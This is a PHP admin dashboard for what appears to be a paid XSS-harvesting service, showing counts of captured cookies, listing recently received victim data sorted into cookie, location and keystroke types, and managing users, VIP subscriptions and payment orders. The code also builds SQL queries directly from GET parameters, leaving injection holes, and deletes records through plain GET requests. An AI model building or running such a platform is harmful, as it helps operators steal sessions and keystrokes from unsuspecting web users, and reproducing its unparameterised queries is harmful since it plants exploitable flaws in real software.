<?php
/**
 * Admin Dashboard Handler
 * 管理員後台
 */
define('ROOT_PATH', dirname(__FILE__).'/..');
include(ROOT_PATH.'/init.php');

$act = Val('act', 'GET');

// 權限檢查 - 只有管理員可以訪問
if($user->userId != 1) {
    ShowError('權限不足', URL_ROOT.'/xss.php');
}

$smarty = InitSmarty();

// 統計數據
$total_projects = $db->GetOne("SELECT COUNT(*) FROM ".Tb('project'));
$total_users = $db->GetOne("SELECT COUNT(*) FROM ".Tb('users'));
$total_cookies = $db->GetOne("SELECT COUNT(*) FROM ".Tb('project_content'));
$total_vip = $db->GetOne("SELECT COUNT(*) FROM ".Tb('users')." WHERE vip_level!='' AND vip_expire>".time());

// 篩選條件
$key = Val('key', 'GET');
$type = Val('type', 'GET');

// 最新收到的數據
$sql = "SELECT pc.*, p.name as project_name FROM ".Tb('project_content')." pc
        LEFT JOIN ".Tb('project')." p ON pc.projectId=p.id
        WHERE 1=1";

if($key) {
    $sql .= " AND (pc.data LIKE '%{$key}%' OR pc.ip LIKE '%{$key}%')";
}
if($type && $type != 'all') {
    $sql .= " AND pc.type='{$type}'";
}
$sql .= " ORDER BY pc.id DESC LIMIT 100";

$recent_data = $db->GetArray($sql);

// 處理數據格式
foreach($recent_data as &$row) {
    $row['add_time'] = $row['addTime'];
    // 判斷數據類型
    $content = $row['data'];
    if(strpos($content, 'cookie') !== false || strpos($content, '=') !== false) {
        $row['data_type'] = 'cookie';
    } elseif(strpos($content, 'http') !== false || strpos($content, 'location') !== false) {
        $row['data_type'] = 'location';
    } elseif(strlen($content) < 50 && preg_match('/^[a-zA-Z\s]+$/', $content)) {
        $row['data_type'] = 'keystroke';
    } else {
        $row['data_type'] = 'other';
    }
}

// 用戶列表
$users = $db->GetArray("SELECT u.*,
    (SELECT COUNT(*) FROM ".Tb('project')." WHERE userId=u.id) as project_count,
    (SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId IN (SELECT id FROM ".Tb('project')." WHERE userId=u.id)) as cookie_count
    FROM ".Tb('users')." u ORDER BY u.id DESC LIMIT 50");

// 訂單列表
$orders = $db->GetArray("SELECT * FROM ".Tb('payment_orders')." ORDER BY id DESC LIMIT 50");

switch($act) {
    case 'view_data':
        $id = Val('id', 'GET');
        $data = $db->FirstRow("SELECT pc.*, p.name as project_name FROM ".Tb('project_content')." pc
                              LEFT JOIN ".Tb('project')." p ON pc.projectId=p.id WHERE pc.id={$id}");
        echo json_encode(['success' => true, 'data' => $data]);
        break;

    case 'delete_data':
        $id = Val('id', 'GET');
        $db->Execute("DELETE FROM ".Tb('project_content')." WHERE id={$id}");
        echo json_encode(['success' => true]);
        break;

    case 'cancel_vip':
        $id = Val('id', 'GET');
        $db->Execute("UPDATE ".Tb('users')." SET vip_level='', vip_expire=0 WHERE id={$id}");
        $db->Execute("DELETE FROM ".Tb('user_subscriptions')." WHERE userId={$id}");
        echo json_encode(['success' => true]);
        break;

    default:
        $smarty->assign('total_projects', $total_projects);
        $smarty->assign('total_users', $total_users);
        $smarty->assign('total_cookies', $total_cookies);
        $smarty->assign('total_vip', $total_vip);
        $smarty->assign('recent_data', $recent_data);
        $smarty->assign('users', $users);
        $smarty->assign('orders', $orders);
        $smarty->display('admin_dashboard.html');
        break;
}
